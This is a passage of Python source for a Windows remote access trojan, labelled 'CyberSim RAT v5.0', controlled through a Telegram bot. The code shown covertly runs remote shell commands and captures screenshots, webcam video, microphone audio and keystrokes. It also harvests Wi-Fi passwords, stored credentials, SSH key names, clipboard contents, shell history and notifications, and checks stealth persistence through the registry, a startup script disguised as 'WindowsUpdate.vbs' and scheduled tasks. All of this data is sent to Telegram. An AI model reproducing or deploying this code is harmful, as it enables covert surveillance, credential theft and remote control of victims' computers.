        msg = (f"CyberSim RAT v5.0 ONLINE\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Host: {host}\nUser: {user}\nOS: Windows\nAdmin: {'YES' if is_admin() else 'NO'}\n"
            f"PID: {os.getpid()}\nMode: {'STEALTH' if '--daemon' in sys.argv else 'NORMAL'}\n"
            f"Keylogger: {self.keylogger.get_status_text()}\nWatchdog: {'Active' if os.path.exists(WATCHDOG_PID_FILE) else 'Off'}\n/help")
        time.sleep(1)
        try: tg_send_text(ADMIN_CHAT_ID, msg)
        except: pass
        try: self.poll_loop()
        except KeyboardInterrupt: self.running = False
        finally: send_shutdown_notification("C2 loop ended")
    def poll_loop(self):
        while self.running:
            try:
                for u in tg_get_updates(offset=self.last_update_id + 1, timeout=10):
                    self.last_update_id = u["update_id"]; self.process_update(u)
            except Exception as e: log(f"Poll err: {e}", C.R)
            time.sleep(POLL_INTERVAL)
    def process_update(self, update):
        msg = update.get("message",{})
        chat_id = str(msg.get("chat",{}).get("id","")); text = msg.get("text",""); doc = msg.get("document",{})
        if doc and chat_id == ADMIN_CHAT_ID: self._handle_upload(chat_id, doc); return
        if chat_id != ADMIN_CHAT_ID or not text: return
        text = text.strip()
        if not text.startswith("/"): return
        parts = text.split(maxsplit=1); cmd = parts[0].lower(); args = parts[1] if len(parts) > 1 else ""
        log(f"CMD: {cmd} {args}", C.CY)
        cmds = {"/help":self.cmd_help,"/sysinfo":self.cmd_sysinfo,"/screenshot":self.cmd_screenshot,
            "/webcam":self.cmd_webcam,"/video":lambda:self.cmd_video(args),"/live":lambda:self.cmd_live(args),
            "/mic":lambda:self.cmd_mic(args),"/browse":lambda:self.cmd_browse(args),
            "/download":lambda:self.cmd_download(args),"/upload":lambda:self.cmd_upload(args),
            "/keylog":lambda:self.cmd_keylog(args),"/shell":lambda:self.cmd_shell(args),
            "/passwords":self.cmd_passwords,"/wifi":self.cmd_wifi,"/clipboard":self.cmd_clipboard,
            "/env":self.cmd_env,"/pid":self.cmd_processes,"/network":self.cmd_network,
            "/ports":self.cmd_ports,"/history":self.cmd_history,"/locate":lambda:self.cmd_locate(args),
            "/status":self.cmd_status,"/apps":self.cmd_apps,"/battery":self.cmd_battery,
            "/whoami":self.cmd_whoami,"/notifications":self.cmd_notifications,
            "/notiflive":lambda:self.cmd_notiflive(args),"/startup_info":self.cmd_startup_info,
            "/defender":self.cmd_defender,"/persistence":self.cmd_persistence,
            "/remove":self.cmd_remove}
        h = cmds.get(cmd)
        if h: h()
        else: tg_send_text(ADMIN_CHAT_ID, f"Unknown: {cmd}\n/help")
    def _handle_upload(self, chat_id, document):
        try:
            fid = document.get("file_id"); fn = document.get("file_name","uploaded")
            r = req_lib.get(f"{API}/getFile", params={"file_id":fid}, timeout=15); res = r.json()
            if res.get("ok"):
                fp = res["result"]["file_path"]; r2 = req_lib.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fp}", timeout=60)
                sp = os.path.join(WORKSPACE, fn)
                with open(sp,'wb') as f: f.write(r2.content)
                tg_send_text(chat_id, f"Uploaded: {fn} ({len(r2.content)}B) -> {sp}")
        except Exception as e: tg_send_text(chat_id, f"Upload err: {e}")
    def cmd_help(self):
        tg_send_text(ADMIN_CHAT_ID,
            "SYSTEM: /sysinfo /status /pid /network /ports /env /passwords /apps /battery /whoami\n"
            "CAPTURE: /screenshot /webcam /video [sec] /live [sec]\n"
            "AUDIO: /mic on|off|status\n"
            "FILES: /browse [path] /download [path] /upload\n"
            "INPUT: /keylog [clear|status|on]\n"
            "SHELL: /shell <cmd>\n"
            "EXTRA: /wifi /clipboard /history /locate <name> /notifications\n"
            "SECURITY: /defender /persistence /startup_info /remove")
    def cmd_startup_info(self):
        tg_send_text(ADMIN_CHAT_ID, f"STARTUP/SHUTDOWN\nStart: RAT ONLINE sent\n"
            f"Stop: RAT OFFLINE sent (SIGTERM/SIGINT/atexit)\nKill: Watchdog restarts in 30s\nPID: {os.getpid()}")
    def cmd_sysinfo(self):
        try:
            uptime = subprocess.getoutput('systeminfo | find "Up Time" 2>nul').strip()
            disk = subprocess.getoutput('wmic logicaldisk get size,freespace,caption 2>nul | findstr ":"').strip()
        except: uptime = disk = "N/A"
        tg_send_text(ADMIN_CHAT_ID, f"Host: {os.environ.get('COMPUTERNAME','')}\n"
            f"OS: Windows {os.environ.get('OS','')}\nUser: {os.environ.get('USERNAME','')}\n"
            f"Admin: {is_admin()}\nArch: {'64-bit' if sys.maxsize>2**32 else '32-bit'}\n"
            f"PID: {os.getpid()}\nPython: {sys.executable}\nUptime: {uptime}\nDisk: {disk}")
    def cmd_screenshot(self):
        tg_send_text(ADMIN_CHAT_ID, "Taking screenshot...")
        path = take_screenshot()
        if path:
            tg_send_photo(ADMIN_CHAT_ID, path, f"Screenshot ({os.path.getsize(path)}B)"); _safe_remove(path)
        else: tg_send_text(ADMIN_CHAT_ID, "Failed! pip install Pillow")
    def cmd_webcam(self):
        tg_send_text(ADMIN_CHAT_ID, "Capturing webcam...")
        path = take_webcam()
        if path:
            tg_send_photo(ADMIN_CHAT_ID, path, f"Webcam ({os.path.getsize(path)}B)"); _safe_remove(path)
        else: tg_send_text(ADMIN_CHAT_ID, "Failed! pip install opencv-python")
    def cmd_video(self, args=""):
        dur = 5
        try: dur = min(max(int(args.strip()),1),30) if args.strip() else 5
        except: pass
        tg_send_text(ADMIN_CHAT_ID, f"Recording {dur}s...")
        path = record_video(dur)
        if path:
            tg_send_video(ADMIN_CHAT_ID, path, f"Video ({os.path.getsize(path)/(1024*1024):.1f}MB)"); _safe_remove(path)
        else: tg_send_text(ADMIN_CHAT_ID, "Failed! Need ffmpeg/opencv")
    def cmd_live(self, args=""):
        iv = 3
        try: iv = int(args.strip()) if args.strip() else 3
        except: pass
        tg_send_text(ADMIN_CHAT_ID, f"Live: 5 shots every {iv}s")
        for i in range(5):
            path = take_screenshot()
            if path: tg_send_photo(ADMIN_CHAT_ID, path, f"[{i+1}/5]"); _safe_remove(path)
            else: tg_send_text(ADMIN_CHAT_ID, f"SS {i+1} failed")
            if i < 4: time.sleep(iv)
        tg_send_text(ADMIN_CHAT_ID, "Live done!")
    def cmd_mic(self, args=""):
        a = args.strip().lower()
        if a == "on": tg_send_text(ADMIN_CHAT_ID, f"Mic: {self.mic.start(ADMIN_CHAT_ID)}")
        elif a == "off": tg_send_text(ADMIN_CHAT_ID, f"Mic: {self.mic.stop()}")
        elif a == "status": tg_send_text(ADMIN_CHAT_ID, f"Mic: {'ON' if self.mic.recording else 'Off'} ({self.mic.chunk_count})")
        else: tg_send_text(ADMIN_CHAT_ID, "/mic on|off|status")
    def cmd_browse(self, args=""):
        args = args.strip(); sh = False
        if not args: path = self.browse_path
        elif args.lower() == "hidden": path = self.browse_path; sh = True
        elif args == "..": path = os.path.dirname(self.browse_path) or "C:\\"
        else: path = args
        try:
            if not os.path.isabs(path): path = os.path.join(self.browse_path, path)
            path = os.path.abspath(path)
            if not os.path.exists(path): tg_send_text(ADMIN_CHAT_ID, f"Not found: {path}"); return
            if os.path.isfile(path):
                sz = os.path.getsize(path)
                s = f"{sz/(1024*1024):.1f}MB" if sz>1048576 else f"{sz/1024:.1f}KB" if sz>1024 else f"{sz}B"
                tg_send_text(ADMIN_CHAT_ID, f"FILE: {path}\n{s}\n/download {path}"); return
            self.browse_path = path
            items = os.listdir(path)
            if not sh: items = [i for i in items if not i.startswith('.') and not i.startswith('~')]
            dirs, files = [], []
            for item in sorted(items, key=str.lower):
                full = os.path.join(path, item)
                try:
                    if os.path.isdir(full): dirs.append(f"[DIR] {item}\\")
                    else:
                        sz = os.path.getsize(full)
                        s = f"{sz/(1024*1024):.1f}MB" if sz>1048576 else f"{sz/1024:.1f}KB" if sz>1024 else f"{sz}B"
                        files.append(f"  {item} ({s})")
                except: files.append(f"  {item} [DENIED]")
            result = f">> {path}\n"
            if dirs: result += "\nDIRS:\n" + "\n".join(dirs[:30])
            if files: result += "\nFILES:\n" + "\n".join(files[:50])
            result += "\n/browse .. | /download [path]"
            if len(result) > 4000:
                fp = os.path.join(WORKSPACE, f"browse_{int(time.time())}.txt")
                _save_to_file(fp, result); tg_send_document(ADMIN_CHAT_ID, fp, f"Dir: {path}"); _safe_remove(fp)
            else: tg_send_text(ADMIN_CHAT_ID, result)
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_download(self, args=""):
        if not args: tg_send_text(ADMIN_CHAT_ID, "Usage: /download <path>"); return
        path = args.strip()
        try:
            if os.path.isdir(path):
                zp = os.path.join(WORKSPACE, os.path.basename(path.rstrip('\\'))+".zip")
                subprocess.run(f'powershell -command "Compress-Archive -Path \'{path}\' -DestinationPath \'{zp}\'"',
                    shell=True, capture_output=True, timeout=60)
                if os.path.exists(zp) and os.path.getsize(zp) > 0:
                    tg_send_document(ADMIN_CHAT_ID, zp, f"Zipped ({os.path.getsize(zp)}B)"); _safe_remove(zp)
                else: tg_send_text(ADMIN_CHAT_ID, "Zip failed")
            elif os.path.exists(path):
                sz = os.path.getsize(path)
                if sz > 50*1024*1024: tg_send_text(ADMIN_CHAT_ID, "Too large (50MB max)"); return
                tg_send_document(ADMIN_CHAT_ID, path, f"{os.path.basename(path)} ({sz}B)")
            else: tg_send_text(ADMIN_CHAT_ID, f"Not found: {path}")
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_upload(self, args): tg_send_text(ADMIN_CHAT_ID, "Send file to upload. Max 50MB")
    def cmd_shell(self, cmd):
        if not cmd: tg_send_text(ADMIN_CHAT_ID, "Usage: /shell <cmd>"); return
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            out = (r.stdout + r.stderr).strip()
            if out:
                if len(out) > 3500:
                    fp = os.path.join(WORKSPACE, f"shell_{int(time.time())}.txt")
                    _save_to_file(fp, r.stdout+r.stderr); tg_send_document(ADMIN_CHAT_ID, fp, f"/shell {cmd}"); _safe_remove(fp)
                else: tg_send_text(ADMIN_CHAT_ID, f"$ {cmd}\n\n{out}")
            else: tg_send_text(ADMIN_CHAT_ID, "(no output)")
        except subprocess.TimeoutExpired: tg_send_text(ADMIN_CHAT_ID, "Timeout (15s)")
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_keylog(self, args=""):
        a = args.strip().lower()
        if a == "clear":
            if self.keylogger.clear(): tg_send_text(ADMIN_CHAT_ID, "Cleared!")
            else: tg_send_text(ADMIN_CHAT_ID, "Nothing to clear")
        elif a == "status":
            sz = os.path.getsize(KEYLOG_FILE) if os.path.exists(KEYLOG_FILE) else 0
            tg_send_text(ADMIN_CHAT_ID, f"KL: {self.keylogger.get_status_text()} | {sz}B | {self.keylogger.keystroke_count} keys")
        elif a == "on":
            if self.keylogger.listener:
                try: self.keylogger.listener.stop()
                except: pass
            self.keylogger = KeyloggerManager(); self.keylogger.start()
            tg_send_text(ADMIN_CHAT_ID, f"Restarted: {self.keylogger.get_status_text()}")
        else:
            data = self.keylogger.dump()
            if data:
                lines = data.strip().split("\n"); recent = "\n".join(lines[-50:])
                if len(recent) > 3500:
                    fp = os.path.join(WORKSPACE, f"kl_{int(time.time())}.txt")
                    _save_to_file(fp, data); tg_send_document(ADMIN_CHAT_ID, fp, f"Keylog ({len(data)}B)"); _safe_remove(fp)
                else: tg_send_text(ADMIN_CHAT_ID, f"Keys ({len(lines)}):\n\n{recent}")
            else: tg_send_text(ADMIN_CHAT_ID, f"No keys. {self.keylogger.get_status_text()}\n/keylog on")
    def cmd_passwords(self):
        res = []
        for path, name in [(os.path.join(os.environ.get('LOCALAPPDATA',''),'Google','Chrome','User Data','Default'),'Chrome'),
                           (os.path.join(os.environ.get('LOCALAPPDATA',''),'Microsoft','Edge','User Data','Default'),'Edge')]:
            if os.path.exists(path):
                res.append(f"{name} profile found")
                for f in ["Login Data","Cookies","Bookmarks","History"]:
                    if os.path.exists(os.path.join(path, f)): res.append(f"  {f}!")
        ff = os.path.join(os.environ.get('APPDATA',''), 'Mozilla','Firefox','Profiles')
        if os.path.exists(ff):
            p = [d for d in os.listdir(ff) if '.default' in d]
            if p: res.append(f"Firefox: {len(p)} profile(s)")
        wifi = subprocess.getoutput('netsh wlan show profiles 2>nul')
        if "Profile" in wifi:
            profs = [l.split(":")[1].strip() for l in wifi.split("\n") if ":" in l and "Profile" in l]
            if profs:
                res.append(f"\nWiFi ({len(profs)}):")
                for p in profs[:10]:
                    pw = subprocess.getoutput(f'netsh wlan show profile name="{p}" key=clear 2>nul | find "Key Content"')
                    res.append(f"  {p}: {pw.split(':')[1].strip() if ':' in pw and 'Key Content' in pw else '(open)'}")
        try:
            creds = subprocess.getoutput('cmdkey /list 2>nul')
            if creds and "Target" in creds:
                res.append("\nCredentials:")
                for line in creds.split("\n"):
                    line = line.strip()
                    if "Target:" in line or "User:" in line: res.append(f"  {line}")
        except: pass
        ssh = os.path.expanduser("~\\.ssh\\")
        if os.path.exists(ssh):
            k = os.listdir(ssh)
            if k: res.append(f"\nSSH: {', '.join(k)}")
        tg_send_text(ADMIN_CHAT_ID, "Passwords & Data\n\n"+"\n".join(res) if res else "No data found")
    def cmd_wifi(self):
        profiles = subprocess.getoutput('netsh wlan show profiles 2>nul'); result = "WiFi:\n"
        for line in profiles.split("\n"):
            if ":" in line and "Profile" in line:
                name = line.split(":")[1].strip()
                if name:
                    pw = subprocess.getoutput(f'netsh wlan show profile name="{name}" key=clear 2>nul | find "Key Content"')
                    result += f"  {name}: {pw.split(':')[1].strip() if ':' in pw else '(none)'}\n"
        tg_send_text(ADMIN_CHAT_ID, result)
    def cmd_clipboard(self):
        try:
            c = subprocess.getoutput('powershell -command Get-Clipboard 2>nul').strip()
            tg_send_text(ADMIN_CHAT_ID, f"Clipboard ({len(c)}ch):\n{c[:3500]}" if c and len(c)>3500 else f"Clipboard:\n{c}" if c else "Empty")
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_env(self):
        r = "Environment:\n"
        for v in ["COMPUTERNAME","USERNAME","USERPROFILE","PATH","HOME","APPDATA","LOCALAPPDATA",
                   "HOMEDRIVE","HOMEPATH","LOGONSERVER","OS","PROCESSOR_ARCHITECTURE","SYSTEMDRIVE","SYSTEMROOT","TEMP","TMP","WINDIR"]:
            val = os.environ.get(v,"")
            if val: r += f"{v}={val[:120]}\n"
        tg_send_text(ADMIN_CHAT_ID, r)
    def cmd_processes(self):
        try:
            out = subprocess.getoutput('tasklist 2>nul'); lines = out.strip().split("\n")
            if len(lines) > 30:
                fp = os.path.join(WORKSPACE, f"proc_{int(time.time())}.txt")
                _save_to_file(fp, out); tg_send_document(ADMIN_CHAT_ID, fp, f"Processes ({len(lines)})"); _safe_remove(fp)
            else: tg_send_text(ADMIN_CHAT_ID, f"Processes:\n\n"+"\n".join(lines))
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_network(self):
        try:
            net = subprocess.getoutput('ipconfig 2>nul')
            try: pub = subprocess.getoutput('powershell -command "(Invoke-WebRequest -Uri ifconfig.me -UseBasicParsing).Content" 2>nul').strip()
            except: pub = ""
            result = f"Network:\n{net}"
            if pub: result += f"\nPublic IP: {pub}"
            wifi = subprocess.getoutput('netsh wlan show interfaces 2>nul')
            if "SSID" in wifi: result += f"\nWiFi:\n{wifi}"
            tg_send_text(ADMIN_CHAT_ID, result[:4000])
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_ports(self):
        try:
            out = subprocess.getoutput('netstat -ano | findstr LISTENING'); lines = out.strip().split("\n")
            tg_send_text(ADMIN_CHAT_ID, "Ports:\n" + "\n".join(lines[:30]) + (f"\n...{len(lines)-30} more" if len(lines)>30 else ""))
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_history(self):
        try:
            content = ""
            ps = os.path.join(os.environ.get('APPDATA',''), r"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
            if os.path.exists(ps):
                with open(ps,'r',errors='ignore') as f: content += f.read()
            ch = subprocess.getoutput('doskey /history 2>nul')
            if ch.strip(): content += "\n" + ch
            if content.strip():
                lines = content.strip().split("\n")
                tg_send_text(ADMIN_CHAT_ID, f"History ({len(lines)}):\n\n"+"\n".join(lines[-30:]))
            else: tg_send_text(ADMIN_CHAT_ID, "No history")
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_locate(self, name):
        if not name: tg_send_text(ADMIN_CHAT_ID, "Usage: /locate <name>"); return
        try:
            out = subprocess.getoutput(f'dir /s /b "C:\\{name}" 2>nul')
            if not out.strip(): out = subprocess.getoutput(f'dir /s /b "%USERPROFILE%\\{name}" 2>nul')
            if out.strip():
                lines = out.strip().split("\n")
                tg_send_text(ADMIN_CHAT_ID, f"'{name}':\n"+"\n".join(lines[:20])+(f"\n...{len(lines)-20} more" if len(lines)>20 else ""))
            else: tg_send_text(ADMIN_CHAT_ID, f"Not found: {name}")
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_apps(self):
        try:
            apps = set()
            for hive in ["HKLM","HKCU"]:
                out = subprocess.getoutput(f'powershell -command "Get-ItemProperty {hive}:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName" 2>nul')
                for l in out.strip().split("\n"):
                    l = l.strip()
                    if l and l != "DisplayName": apps.add(l)
            apps = sorted(apps); result = "Apps:\n"+"\n".join(apps[:50])
            if len(apps) > 50: result += f"\n...{len(apps)-50} more"
            if len(result) > 4000:
                fp = os.path.join(WORKSPACE, f"apps_{int(time.time())}.txt")
                _save_to_file(fp, "\n".join(apps)); tg_send_document(ADMIN_CHAT_ID, fp, f"Apps ({len(apps)})"); _safe_remove(fp)
            else: tg_send_text(ADMIN_CHAT_ID, result)
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_battery(self):
        try:
            info = subprocess.getoutput('wmic path win32_battery get EstimatedChargeRemaining,BatteryStatus 2>nul')
            if not info.strip(): info = subprocess.getoutput('powercfg /batteryreport /output "%TEMP%\\bat.xml" 2>nul && type "%TEMP%\\bat.xml"')
            tg_send_text(ADMIN_CHAT_ID, f"Battery:\n{info}" if info.strip() else "No battery (desktop?)")
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_whoami(self):
        tg_send_text(ADMIN_CHAT_ID, f"User: {os.environ.get('USERNAME','')}\nHost: {os.environ.get('COMPUTERNAME','')}\n"
            f"Admin: {is_admin()}\nPID: {os.getpid()}\nOS: {os.environ.get('OS','')}")
    def cmd_notifications(self):
        result = self.notif_reader.get_notifications(20)
        if len(result) > 4000:
            fp = os.path.join(WORKSPACE, f"notif_{int(time.time())}.txt")
            _save_to_file(fp, result); tg_send_document(ADMIN_CHAT_ID, fp, "Notifications"); _safe_remove(fp)
        else: tg_send_text(ADMIN_CHAT_ID, result)
    def cmd_notiflive(self, args=""):
        a = args.strip().lower()
        if a == "off": self.notif_live_running = False; tg_send_text(ADMIN_CHAT_ID, "NotifLive: OFF"); return
        if self.notif_live_running: tg_send_text(ADMIN_CHAT_ID, "Already running!\n/notiflive off"); return
        self.notif_live_running = True; tg_send_text(ADMIN_CHAT_ID, "NotifLive: ON (15s)\n/notiflive off")
        def loop():
            last = ""
            while self.notif_live_running:
                try:
                    r = self.notif_reader.get_notifications(5)
                    if r != last and len(r) > 50: tg_send_text(ADMIN_CHAT_ID, f"[LIVE]\n{r[:2000]}"); last = r
                    time.sleep(15)
                except: time.sleep(30)
            self.notif_live_running = False
        threading.Thread(target=loop, daemon=True).start()
    def cmd_status(self):
        tg_send_text(ADMIN_CHAT_ID, f"Host: {os.environ.get('COMPUTERNAME','')}\nUser: {os.environ.get('USERNAME','')}\n"
            f"Admin: {is_admin()}\nPID: {os.getpid()}\nPython: {sys.executable}\n"
            f"Keylogger: {self.keylogger.get_status_text()}\nMic: {'ON' if self.mic.recording else 'Off'}\n"
            f"Watchdog: {'Active' if os.path.exists(WATCHDOG_PID_FILE) else 'Off'}\nLog: {LOG_FILE}")
    def cmd_defender(self):
        try:
            st = subprocess.getoutput('powershell -command "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled | Format-List" 2>nul')
            ex = subprocess.getoutput('powershell -command "Get-MpPreference | Select-Object ExclusionPath,ExclusionProcess | Format-List" 2>nul')
            tg_send_text(ADMIN_CHAT_ID, f"Defender:\n{st}\nExclusions:\n{ex}"[:4000])
        except Exception as e: tg_send_text(ADMIN_CHAT_ID, f"Error: {e}")
    def cmd_persistence(self):
        r = "PERSISTENCE\n"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY_PATH)
            v, _ = winreg.QueryValueEx(key, REG_VALUE_NAME); winreg.CloseKey(key)
            r += f"Registry: SET ({v})\n"
        except: r += "Registry: NOT SET\n"
        r += f"Startup: BAT={'Y' if os.path.exists(STARTUP_BAT) else 'N'} VBS={'Y' if os.path.exists(os.path.join(STARTUP_DIR,'WindowsUpdate.vbs')) else 'N'}\n"
        for tn in [TASK_NAME, f"{TASK_NAME}_SYS"]:
            ret = subprocess.run(f'schtasks /Query /TN "{tn}"', shell=True, capture_output=True, text=True)
            if ret.returncode == 0: r += f"Task '{tn}': ACTIVE\n"
            else: r += f"Task '{tn}': NOT SET\n"
        ret3 = subprocess.run(f'netsh advfirewall firewall show rule name="{TASK_NAME}"', shell=True, capture_output=True, text=True)
        r += f"Firewall: {'EXISTS' if ret3.returncode == 0 else 'NO RULE'}"
        tg_send_text(ADMIN_CHAT_ID, r[:4000])
    def cmd_remove(self):
        try:
            uninstall_stealth()
            tg_send_text(ADMIN_CHAT_ID, f"RAT REMOVED from {os.environ.get('COMPUTERNAME','')}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Remove failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
        if arg == "--install": install_stealth()
        elif arg == "--uninstall": uninstall_stealth()
        elif arg == "--daemon": run_as_daemon()
        elif arg == "--watchdog": run_watchdog()
        elif arg == "--status": show_status()
        elif arg in ("--help","-h","/?","/help"): print(__doc__)
        else: print(f"Unknown: {arg}\nUse: --install|--uninstall|--daemon|--status|--help")
    else:
        print(f"\n{C.BD}CyberSim Lab v5.0 - Normal Mode{C.RS}\n{C.DM}Tip: --install for stealth setup{C.RS}\n")
        if not ensure_requests(): print(f"{C.R}requests missing! Run --install first.{C.RS}"); sys.exit(1)
        if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE": print(f"{C.R}Set BOT_TOKEN and ADMIN_CHAT_ID!{C.RS}"); sys.exit(1)
        try: TelegramC2().start()
        except Exception as e:
            log(f"Crashed: {e}", C.R); send_notification_to_admin(f"RAT CRASHED!\n{e}")
